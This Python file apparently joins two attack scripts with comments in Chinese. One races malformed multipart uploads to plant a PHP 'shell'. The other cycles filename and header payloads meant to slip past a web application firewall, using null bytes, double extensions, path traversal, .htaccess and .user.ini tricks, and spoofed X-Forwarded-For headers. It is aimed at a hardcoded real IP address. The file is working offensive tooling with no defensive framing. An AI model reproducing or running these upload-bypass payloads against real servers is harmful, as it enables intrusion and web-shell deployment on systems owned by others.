import requests
import threading
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_payload():
    # 生成大量空格来触发正则回溯
    spaces = " " * 8000
    # 构造畸形的文件名以触发内存分配错误
    filename = f"1{spaces}.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    php"
    # 生成payload
    shell_content = 'k'
    return filename, shell_content

def upload_file(url, shell_content):
    try:
        filename, content = generate_payload()
        # 构造畸形的multipart数据
        files = {
            'file': (filename, content, 'application/octet-stream')
        }
        # 使用特殊字符构造boundary触发编码错误
        boundary = "------------------------" + "".join([chr(random.randint(1, 127)) for _ in range(32)])
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Connection': 'close',
            # 添加额外的换行来构造畸形请求
            'Content-Length': '1024\r\n\r\n'
        }
        # 添加延迟以利用时间差
        time.sleep(0.01)
        response = requests.post(url, files=files, headers=headers)
        return response.status_code
    except:
        return None

def check_file(url, filename):
    try:
        # 检查多个可能的临时文件位置
        paths = [
            f"{url}/{filename}",
            f"{url}/upload/{filename}"
        ]
        for path in paths:
            response = requests.get(path)
            if response.status_code == 200:
                return True
        return False
    except:
        return False

def race_upload(target_url, threads=10, attempts=100):
    shell_name = f"1_{random_string()}.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    php"
    shell_content = 'k'
    
    def worker():
        upload_file(target_url, shell_content)
    
    print(f"[*] Starting race condition test...")
    print(f"[*] Target: {target_url}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Attempts: {attempts}")
    
    for i in range(attempts):
        print(f"[*] Attempt {i+1}/{attempts}")
        
        # 创建更多线程以增加竞争条件的概率
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # 同时发起多个请求
            futures = []
            for _ in range(threads):
                futures.append(executor.submit(worker))
                # 添加极短延迟增加竞争条件概率
                time.sleep(0.001)
            
            # 等待所有任务完成
            for future in futures:
                try:
                    future.result(timeout=1)
                except:
                    continue
        
        # 检查文件是否上传成功
        if check_file(target_url, shell_name):
            print(f"[+] Success! Shell uploaded: {target_url}/{shell_name}")
            return True
            
        time.sleep(0.05)  # 稍微减少延迟以提高效率
    
    print("[-] Race condition attack failed")
    return False

import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_payload():
    # 文件名混淆方式
    payloads = [
        # 基础混淆
        f"1{'.' * 8000}php",
        f"1{'A' * 8000}php",
        f"1{' ' * 8000}php",
        # 特殊字符
        "shell.php\x00.jpg",
        "shell.php\n.jpg",
        "shell.php#.jpg",
        "shell.php/.jpg",
        "shell.php\\.jpg",
        # 编码混淆
        "=?utf-8?B?c2hlbGwucGhw?=",
        "=?utf-8?Q?shell=2Ephp?=",
        # 目录穿越
        ".././../shell.php",
        "..\\..\\shell.php",
        # 后缀组合
        "shell.php.jpg.php",
        "shell.pHp5.jpg",
        "shell.php%00.jpg",
        "shell.php%20.jpg",
        # 特殊文件
        ".htaccess",
        ".user.ini",
    ]

    # Content-Disposition变体 - 移除可能导致错误的换行符
    dispositions = [
        'form-data; name="file"; filename="shell.php"',
        'form-data; name="file"; filename="1.jpg"; filename="shell.php"',
        'form-data; name="file"; filename="shell.php"',
        "form-data; name='file'; filename='shell.php'",
        'form-data; name=file; filename=shell.php',
        'form-data;    name="file";    filename="shell.php"',
        f'form-data; {"A"*1000}; name="file"; filename="shell.php"',
    ]

    # Content-Type变体
    content_types = [
        'application/octet-stream',
        'image/jpeg',
        'image/gif',
        'text/plain',
        'application/x-httpd-php',
    ]

    # 构造boundary - 确保boundary字符合法
    boundary = "------------------------" + "".join(random.choices(string.ascii_letters + string.digits, k=16))

    filename = random.choice(payloads)
    shell_content = '1111'
    
    # 修复headers构造
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Connection': 'close',
        'Content-Length': str(random.randint(1000, 9999)),  # 移除\r\n\r\n
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*'
    }
    
    # Content-Disposition现在作为files参数的一部分，而不是header
    return filename, shell_content, headers, random.choice(content_types)

def upload_file(url):
    try:
        filename, content, headers, content_type = generate_payload()
        files = {
            'file': (filename, content, content_type)
        }
        
        response = requests.post(url, files=files, headers=headers)
        
        if "post_data_chekc ok" in response.text:
            print(f"\n[+] WAF绕过成功!")
            print(f"[+] 使用的payload: {filename}")
            print(f"[+] 使用的headers: {headers}")
            return True
        else:
            print(f"[-] 尝试失败: {filename}")
        return False
    except Exception as e:
        print(f"[-] 错误: {str(e)}")
        return False

def main():
    target = "http://27.106.122.172/"
    print("[*] 开始测试WAF绕过...")
    
    attempts = 100
    for i in range(attempts):
        print(f"\n[*] 第 {i+1}/{attempts} 次尝试")
        if upload_file(target):
            break

if __name__ == "__main__":
    main()